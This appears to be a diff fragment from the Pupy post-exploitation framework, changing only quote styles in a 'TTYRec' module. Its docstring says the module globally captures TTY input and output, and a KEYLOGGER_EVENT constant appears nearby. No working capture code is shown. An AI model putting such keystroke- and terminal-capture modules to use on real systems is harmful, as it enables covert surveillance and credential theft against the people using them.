@@ -13,7 +13,7 @@ KEYLOGGER_EVENT = 0x14000001
 
 __class_name__ = 'TTYRec'
 
-@config(cat='gather', compat=['linux'])
+@config(cat='gather', compat=["linux"])
 class TTYRec(PupyModule):
     ''' Globally capture intput/output to TTY. Compatible with kernels
         which have KProbes tracing. Right now backed module tested/works only on AMD64.
@@ -23,7 +23,7 @@ class TTYRec(PupyModule):
     unique_instance = True
 
     dependencies = {
-        'linux': ['ttyrec']
+        "linux": ['ttyrec']
     }
 
     header = struct.Struct('<16ssIIII')
